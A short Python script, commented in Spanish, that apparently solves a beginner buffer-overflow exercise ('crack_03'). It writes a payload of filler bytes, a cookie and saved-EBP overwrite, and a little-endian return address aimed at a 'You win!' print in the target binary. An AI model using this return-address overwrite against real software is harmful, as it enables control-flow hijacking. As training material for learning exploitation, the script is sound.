from struct import pack

exploit = 'A'*60 # Llenar el buf
exploit += 'BBBB' # Llenar la cookie
exploit += 'CCCC' # Llenar el ebp
exploit += pack('<I', 0x0804845a) # Retornar hacia el address del printf("You win!")

f = open('crack_03.txt', 'wb')
f.write(exploit)
f.close()